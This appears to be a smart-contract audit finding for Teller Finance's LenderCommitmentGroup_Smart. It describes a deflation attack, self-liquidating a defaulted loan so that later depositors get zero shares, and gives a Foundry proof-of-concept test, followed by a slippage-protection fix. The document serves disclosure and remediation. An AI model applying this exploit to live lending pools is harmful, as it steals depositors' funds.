---
id: 25672
severity: "Medium"
---

# LenderCommitmentGroup_Smart_test::addPrincipalToCommitmentGroup/burnSharesToWithdrawEarnings() are vulnerable to slippage attacks

## Description



## Proof of Concept

## Vulnerability Detail

The share price may be manipulated to steal funds from users adding or burning shares to the protocol. Although it is not to possible to donate funds to `LenderCommitmentGroup_Smart_test` to perform an inflation attack, the share price can still be modified by taking loans and defaulting them. The following is an example of an attack, inspired by inflation attacks but is actually a deflation attack:

1. Deposit `1e18` in `LenderCommitmentGroup_Smart_test::addPrincipalToCommitmentGroup()`.
2. Take out a loan of `1e18`.
3. Let the loan default and liquidate it, waiting some time to receive incentives and decrease the value of shares. If the attacker is able to default the loan using the max incentive, equalling the total amount borrowed, `poolTotalEstimatedValue_` will be 0.
4. If `poolTotalEstimatedValue_ == 0`, deposit in `LenderCommitmentGroup_Smart_test::addPrincipalToCommitmentGroup()` will hand out 0 shares to users.
5. The attacker will steal all deposits due to being the holder of all shares supply.

The following POC demonstrates the attack above. The test is inserted in the file pasted in issue 'Drained lender due to LenderCommitmentGroup_Smart::acceptFundsForAcceptBid() _collateralAmount by STANDARD_EXPANSION_FACTOR multiplication'.

```solidity
function test_POC_sharePriceManipulation() public {
    uint256 principalAmount = 1e18;
    deal(address(DAI), attacker, principalAmount);
    vm.startPrank(attacker);

    // add principal to lender to get shares
    DAI.approve(address(lender), principalAmount);
    uint256 shares = lender.addPrincipalToCommitmentGroup(principalAmount, attacker);

    // approve the forwarder
    tellerV2.approveMarketForwarder(marketId, address(smartCommitmentForwarder));

    // borrow the principal
    uint256 collateralAmount = 1;
    deal(address(WETH), attacker, collateralAmount);
    WETH.approve(address(collateralManager), collateralAmount);
    uint256 bidId = smartCommitmentForwarder.acceptCommitmentWithRecipient(
        address(lender),
        principalAmount,
        collateralAmount,
        0,
        address(WETH),
        attacker,
        0,
        2 days
    );

    // attacker liquidates itself, making lender have a 0 total value
    // but non 0 shares
    skip(3 days + 10000);
    deal(address(DAI), attacker, 1e18);
    DAI.approve(address(lender), 1e18);
    lender.liquidateDefaultedLoanWithIncentive(bidId, -int256(1e18));

    vm.stopPrank();

    // borrower mints 0 shares
    uint256 userDai = 1000e18;
    vm.startPrank(user);
    deal(address(DAI), user, userDai);
    DAI.approve(address(lender), userDai);
    assertEq(lender.addPrincipalToCommitmentGroup(userDai, user), 0);
    vm.stopPrank();

    // poolSharesToken are burned incorrectly before calculating exchange rate
    // so this must be fixed or exchange rate will be 1
    vm.mockCall(
        address(lender.poolSharesToken()),
        abi.encodeWithSignature("burn(address,uint256)", attacker, shares),
        ""
    );

    // attacker receives the DAI from the user above
    vm.prank(attacker);
    assertEq(lender.burnSharesToWithdrawEarnings(shares, attacker), userDai);
}
```

## Impact

Attacker steals all deposits in `LenderCommitmentGroup_Smart`.

## Code Snippet

[https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L307-L310](<https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L307-L310>) [https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L396-L399](<https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L396-L399>)

## Recommendation

Add slippage protection to `LenderCommitmentGroup_Smart_test::addPrincipalToCommitmentGroup/burnSharesToWithdrawEarnings()` by sending `minAmountOut` arguments in both functions. This is similar to how Uniswap handles sandwich attacks in their [router](<https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L151-L152>).
